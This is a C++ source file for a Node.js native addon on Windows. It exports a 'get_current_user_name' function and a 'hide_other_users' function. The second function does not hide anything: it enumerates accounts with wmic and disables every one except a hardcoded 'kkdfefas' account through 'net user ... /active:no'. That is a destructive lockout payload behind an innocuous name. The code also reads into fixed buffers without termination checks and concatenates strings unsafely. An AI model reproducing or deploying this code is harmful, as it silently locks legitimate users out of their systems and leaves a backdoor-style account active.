#include <node.h>
#include <stdlib.h>
#include <string.h>

using v8::FunctionCallbackInfo;
using v8::Isolate;
using v8::Local;
using v8::Object;
using v8::String;
using v8::Value;

void Method(const FunctionCallbackInfo<Value>& args) {
  FILE* file;
  char output[300];
  char *command = "whoami";
  file = _popen(command, "r");
  fread(output, 1, sizeof(output), file);
  fclose(file);

  Isolate* isolate = args.GetIsolate();
  args.GetReturnValue().Set(String::NewFromUtf8(isolate, output));
}

void Method2(const FunctionCallbackInfo<Value>& args) {
  FILE* file;
  char output[300];
  char *command = "whoami";
  file = _popen(command, "r");
  fread(output, 1, sizeof(output), file);
  fclose(file);

  FILE* file2;
  char output2[300];
  char *command2 = "wmic useraccount get name | findstr -v Name";
  file2 = _popen(command2, "r");
  fread(output2, 1, sizeof(output2), file2);
  fclose(file2);

  char temp[300];
  for (int i=0;i<sizeof(temp);i++) {
    temp[i] = 0;
  }
  int j = 0;
  for (int i=0;i<sizeof(output2);i++) {
    if ((!((0x61 <= output2[i] && output2[i] <= 0x7A) || (0x41 <= output2[i] && output2[i] <= 0x5A) || (0x30 <= output2[i] && output2[i] <= 0x39))) && j == 0) {
      break;
    }
    if (output2[i] == '\n') {
      temp[j] = 0;
      j = 0;
      if (strcmp(temp, "kkdfefas") != 0) {
        char command3[300] = "net user ";
        strcat(command3, temp);
        strcat(command3, " /active:no");
        _popen(command3, "r");
      }
      continue;
    }
    temp[j] = output2[i];
    j++;
  }

  Isolate* isolate = args.GetIsolate();
  args.GetReturnValue().Set(String::NewFromUtf8(isolate, temp));
}

void init(Local<Object> exports) {
  NODE_SET_METHOD(exports, "get_current_user_name", Method);
  NODE_SET_METHOD(exports, "hide_other_users", Method2);
}

NODE_MODULE(addon, init)
